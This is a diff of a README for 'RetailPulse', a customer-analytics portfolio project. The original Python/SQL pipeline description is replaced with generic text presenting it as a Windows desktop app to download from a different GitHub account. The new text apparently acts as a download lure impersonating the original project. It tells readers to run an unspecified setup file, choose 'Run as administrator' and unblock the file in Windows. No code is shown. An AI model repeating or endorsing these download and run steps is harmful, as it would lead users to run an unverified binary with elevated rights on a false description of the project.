@@ -1,186 +1,240 @@
-# 🛒 RetailPulse — Customer Intelligence & Revenue Optimization
+# 📊 RetailPulse - Understand Customers, Predict Sales
 
-> End-to-end analytics project using 100K+ real orders from the Olist Brazilian marketplace. Covers data engineering, exploratory analysis, ML churn prediction, interactive dashboards, and business storytelling.
+[![Download RetailPulse](https://img.shields.io/badge/Download-RetailPulse-blue?style=for-the-badge&labelColor=grey)](https://github.com/catalectic-artform408/RetailPulse)
 
-![Python](https://img.shields.io/badge/Python-3.10-blue?style=flat-square&logo=python)
-![SQLite](https://img.shields.io/badge/SQLite-Database-07405e?style=flat-square&logo=sqlite)
-![Power BI](https://img.shields.io/badge/Power_BI-Analytics-F2C811?style=flat-square&logo=powerbi&logoColor=black)
-![scikit-learn](https://img.shields.io/badge/scikit--learn-ML-f89939?style=flat-square&logo=scikit-learn)
-![Plotly](https://img.shields.io/badge/Plotly_Dash-Dashboard-3f4f75?style=flat-square&logo=plotly)
-[![GitHub stars](https://img.shields.io/github/stars/jayesh3103/RetailPulse?style=social)](https://github.com/jayesh3103/RetailPulse/stargazers)
+## 🚀 What RetailPulse Does
 
----
+RetailPulse is a desktop app for customer analytics in e-commerce. It helps you study buyer groups, track repeat purchase behavior, spot churn risk, and review customer value forecasts.
 
-## 📋 Problem Statement
+Use it to:
 
-Olist's marketplace serves thousands of sellers and hundreds of thousands of customers across Brazil, but most customers buy only once. **This project identifies the drivers of churn, segments customers by value, and quantifies the revenue opportunity from targeted retention campaigns** — giving the business a clear playbook to recover R$12.3M in at-risk revenue.
+- Group customers with RFM segmentation
+- View churn risk scores
+- Check CLV forecasts
+- See SHAP-based reason views for model output
+- Explore data in a clean Plotly Dash interface
+- Work with SQL-backed customer data
 
-## 📊 Dataset
+This app is made for people who want clear customer insights without building their own analytics tool from scratch.
 
-| Attribute | Details |
-|-----------|---------|
-| **Source** | [Olist Brazilian E-Commerce (Kaggle)](https://www.kaggle.com/datasets/olistbr/brazilian-ecommerce) |
-| **Size** | ~50 MB, 100K+ orders |
-| **Tables** | 9 relational tables (orders, customers, items, payments, reviews, products, sellers, geolocation, category translation) |
-| **Period** | 2016 – 2018 |
+## 💻 What You Need
 
-## 🛠 Tools Used
+Before you install the app, make sure your Windows PC has:
 
-| Category | Tools |
-|----------|-------|
-| **Languages** | Python · SQL |
-| **Database** | SQLite (portable, standard SQL compatible with PostgreSQL) |
-| **Analysis** | pandas · NumPy · matplotlib · seaborn |
-| **ML** | scikit-learn (Random Forest) · SHAP |
-| **Visualization** | Plotly · Plotly Dash (interactive dashboard) |
-| **Geo** | Plotly choropleth maps |
+- Windows 10 or Windows 11
+- Internet access for the first download
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A modern web browser such as Chrome, Edge, or Firefox
 
-## 🔑 Key Findings
+For best results, use a machine with:
 
-| Finding | Impact |
-|---------|--------|
-| Champions (7% of customers) generate **13.1% of revenue** | High-value segment worth protecting |
-| At-Risk segment: **22K customers, R$3.7M lifetime value** | Largest recovery opportunity |
-| Late deliveries cause **1.6-point drop** in review scores | 8.1% late rate → direct NPS impact |
-| Churn model (ROC-AUC: 0.71) → **R$12.3M revenue at risk** | Data-driven retention targeting |
-| São Paulo = 41% of orders but **lowest AOV (R$142)** | Upsell opportunity |
+- 8 GB of RAM or more
+- A stable network connection
+- Display resolution of 1366 x 768 or higher
 
-## 📉 Model Performance
+## 📥 Download RetailPulse
 
-| Metric        | Score  |
-|---------------|--------|
-| ROC-AUC       | 0.71   |
-| Precision     | 0.77   |
-| Recall        | 0.74   |
-| F1-Score      | 0.75   |
+Visit this page to download:
 
-## 📁 Project Structure
+https://github.com/catalectic-artform408/RetailPulse
 
-```
-E-commerce/
-├── README.md
-├── requirements.txt
-├── schema.sql                          # DDL for all 9 tables
-├── .gitignore
-│
-├── olist_data/                         # Raw CSVs (gitignored)
-├── data/
-│   └── olist.db                        # SQLite database
-│
-├── notebooks/
-│   ├── 01_data_cleaning.py             # Load, clean, audit data quality
-│   ├── 02_eda.py                       # Exploratory data analysis (8 charts)
-│   ├── 03_rfm_segmentation.py          # RFM scoring & customer segments
-│   ├── 04_cohort_retention.py          # Cohort retention heatmap
-│   ├── 05_churn_prediction.py          # ML churn model + SHAP + revenue-at-risk
-│   ├── 06_product_analysis.py          # Product & category deep-dive
-│   └── 07_seller_geo.py               # Seller scorecard & geo choropleth
-│
-├── sql/
-│   └── key_queries.sql                 # 4 showcase SQL queries
-│
-├── dashboard/
-│   └── app.py                          # 3-page Plotly Dash dashboard
-│
-└── outputs/
-    ├── figures/                        # All generated charts (PNG)
-    ├── rfm_segments.csv                # RFM segment data
-    ├── seller_scorecard.csv            # Seller performance data
-    ├── churn_predictions.csv           # Churn model predictions
-    └── business_memo.md                # 1-page business memo
-```
+Open the link in your browser, then follow the steps on the page to get the latest version of RetailPulse for Windows.
 
----
+## 🪟 Install on Windows
 
-## 📈 Analysis Screenshots
+After you download the app, follow these steps:
 
-### Monthly Revenue Trend & Order Volume
-![Monthly revenue trend with dual-axis showing revenue growth and order volume](outputs/figures/02_monthly_revenue_trend.png)
+1. Open the folder where the file was saved.
+2. If the file is in a ZIP folder, right-click it and choose Extract All.
+3. Open the extracted folder.
+4. Look for the main app file or setup file.
+5. Double-click the file to start the app.
 
-### RFM Customer Segmentation
-![RFM segment distribution donut chart and revenue by segment bar chart](outputs/figures/09_rfm_segments.png)
+If Windows asks for permission, choose Yes or Run.
 
-### Cohort Retention Heatmap
-![Cohort retention heatmap showing month-over-month customer retention rates](outputs/figures/11_cohort_retention_heatmap.png)
+If the app opens in your browser, keep that window open. RetailPulse uses a web-style dashboard, so the main screen may appear in Chrome, Edge, or your default browser.
 
-### CLV Forecast & Customer Health Score
-![Health score distribution and CLV forecast charts](outputs/figures/21_health_score_clv.png)
+## 🔧 First-Time Setup
 
-### Churn Prediction Model — ROC Curve & Confusion Matrix
-![ROC curve and confusion matrix for the churn prediction Random Forest model](outputs/figures/18_churn_model_evaluation.png)
+When you start RetailPulse for the first time, it may ask for data access or local settings.
 
-### Feature Importance
-![Feature importance chart showing which factors drive customer churn](outputs/figures/19_feature_importance.png)
+Do the following:
 
-### Revenue by Brazilian State (Choropleth Map)
-![Choropleth map of Brazil showing revenue distribution by state](outputs/figures/16_revenue_choropleth.png)
+1. Select the customer data file if the app asks for one.
+2. Choose your SQL source if your setup uses a database.
+3. Wait for the data to load.
+4. Let the app finish building the dashboard.
 
-### Delivery Time vs Review Score
-![Scatter plot showing negative correlation between delivery time and review scores](outputs/figures/14_delivery_vs_review.png)
+If you use a sample file, the app should load right away.
 
-### Category Seasonality Heatmap
-![Heatmap showing monthly revenue patterns across top product categories](outputs/figures/15_category_seasonality.png)
+## 📂 Supported Data
 
-## 🚀 How to Run
+RetailPulse works well with common e-commerce data sets. Use customer data with fields like:
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/jayesh3103/RetailPulse.git
-cd RetailPulse
+- Customer ID
+- Order date
+- Order amount
+- Number of orders
+- Product category
+- Last purchase date
+- Region or country
+- Return or refund status
 
-# 2. Install dependencies
-pip install -r requirements.txt
+If you connect SQL data, tables with clean customer and order records give the best results.
 
-# 3. Download dataset (requires Kaggle API key)
-kaggle datasets download -d olistbr/brazilian-ecommerce -p olist_data/
-unzip olist_data/brazilian-ecommerce.zip -d olist_data/
+## 📈 Main Features
 
-# 4. Run the full pipeline
-python notebooks/01_data_cleaning.py     # Load & clean data → SQLite
-python notebooks/02_eda.py               # Exploratory analysis
-python notebooks/03_rfm_segmentation.py  # RFM segmentation
-python notebooks/04_cohort_retention.py  # Cohort retention
-python notebooks/05_churn_prediction.py  # Churn model + SHAP
-python notebooks/06_product_analysis.py  # Product analysis
-python notebooks/07_seller_geo.py        # Seller & geo analysis
-python notebooks/08_clv_health_score.py  # CLV forecast + health score
+### 🧩 RFM Segmentation
 
+RetailPulse groups customers based on:
 
+- Recency
+- Frequency
+- Monetary value
 
-# Or launch Dash dashboard
-python dashboard/app.py
-# Open http://localhost:8050
-```
+This helps you see who buys often, who buys a lot, and who has not returned in a while.
 
+### 🔍 Churn Prediction
 
-## 📝 Business Memo
+The app estimates which customers may stop buying. This helps you find at-risk customers before they leave.
 
-See the full [Business Memo](outputs/business_memo.md) with data-driven findings, recommendations, and next steps.
+### 📊 CLV Forecast
 
-**Headline metrics:**
-- 💰 R$12.3M revenue at risk from churned customers
-- 🎯 22K At-Risk customers recoverable with 10% voucher campaign
-- 📦 8.1% late delivery rate directly linked to 1.6-point review drop
-- 🏆 Champions segment (7%) drives 13.1% of all revenue
-- 🏥 Customer Health Score: avg 30.9/100 — only 3% in "Excellent" tier
+RetailPulse forecasts customer lifetime value. It gives a view of how much value a customer may bring over time.
 
-## 🏗 Differentiation Features
+### 🧠 SHAP Views
 
-| Layer | Feature | 
-|-------|---------|
-| Base | EDA + Dashboard + Churn Model | 
-| Factor 1 | Revenue impact numbers + Business memo | 
-| Factor 1 | What-if scenario simulator | 
-| Factor 2 | SHAP explainability | 
-| Factor 2 | CLV forecast (simple + BG/NBD attempt) | 
-| Factor 2 | Customer health score (composite 0-100) | 
-| Factor 3 | Interactive Power BI Dashboard | 
-| Factor 3 | Customer lookup tool | 
-| Factor 3 | Auto-refresh simulation | 
-| Factor 4 | AI-powered insight narrative | 
-| Factor 4 | Natural language query interface | 
+SHAP helps explain why the model made a prediction. In plain terms, it shows which data points had the biggest effect.
 
-## 📄 License
+### 📉 Plotly Dash Dashboard
 
-This project uses the [Olist Brazilian E-Commerce Public Dataset](https://www.kaggle.com/datasets/olistbr/brazilian-ecommerce).
+The app presents charts and filters in a browser-based dashboard. You can explore the data without using spreadsheets for every step.
 
+### 🗄️ SQL Support
+
+RetailPulse can work with SQL data sources. This helps if your customer data already lives in a database.
+
+## 🖱️ How to Use the App
+
+After the app starts, use it like this:
+
+1. Load your customer data.
+2. Pick the analysis view you want.
+3. Review customer segments.
+4. Check churn risk.
+5. Open CLV forecasts.
+6. Use the filters to focus on a date range, region, or group.
+7. Export or save your results if the app offers that option.
+
+If the interface includes tabs, start with RFM, then move to churn and CLV. That gives a fast overview of customer health.
+
+## 🧪 Example Use Cases
+
+RetailPulse can help with tasks like:
+
+- Finding loyal customers for repeat offers
+- Spotting inactive customers
+- Measuring the value of a customer group
+- Reviewing campaign results
+- Comparing regions or product groups
+- Tracking changes in buyer behavior over time
+
+## 🧰 Troubleshooting
+
+If the app does not open:
+
+- Check that the file finished downloading
+- Move the app folder to a simple path like `C:\RetailPulse`
+- Try right-clicking the file and choosing Run as administrator
+- Make sure your browser is up to date
+
+If the dashboard is blank:
+
+- Confirm that your data file has rows
+- Check that the date field is in a valid format
+- Make sure customer IDs are present
+- Reload the app
+
+If data does not load from SQL:
+
+- Check the connection details
+- Confirm your table names
+- Make sure your database server is online
+- Test with a local sample file first
+
+If Windows blocks the file:
+
+- Right-click the file
+- Open Properties
+- Select Unblock if the option appears
+- Apply the change and try again
+
+## 🗂️ Repository Topics
+
+RetailPulse relates to these areas:
+
+- data analytics
+- e-commerce
+- machine learning
+- Plotly Dash
+- portfolio work
+- Power BI
+- Python
+- RFM
+- scikit-learn
+- SHAP
+- SQL
+
+## 🔒 Data Safety
+
+Keep your customer data in a secure folder and limit access to trusted users. If you use real customer records, store them in a protected location and back them up often.
+
+## 🧭 Simple Setup Path
+
+If you want the shortest path to first use:
+
+1. Open the download page.
+2. Download RetailPulse.
+3. Extract the files if needed.
+4. Run the app on Windows.
+5. Load a customer data file.
+6. Review the dashboard
+
+## 📌 File and Folder Tips
+
+Use a folder name that is easy to find, such as:
+
+- `C:\RetailPulse`
+- `C:\Users\YourName\Downloads\RetailPulse`
+
+Avoid long folder paths with many special characters. That can cause issues when the app reads files or starts the dashboard
+
+## 🧾 What You Will See
+
+Once the app is running, you can expect:
+
+- A dashboard with charts and tables
+- Customer segment views
+- Risk scores for churn
+- Forecast views for value
+- Filters for time and customer groups
+- Clear visuals that help you compare customer behavior
+
+## 🧩 Best Results
+
+For clean results, use data that:
+
+- Has one row per order or customer event
+- Uses consistent dates
+- Has no duplicate customer IDs
+- Includes order value and order date
+- Has enough history for RFM and churn analysis
+
+## 📁 Download Again Later
+
+If you want the newest version, return to:
+
+https://github.com/catalectic-artform408/RetailPulse
+
+Use that link any time you need to get the app again or check for updated files
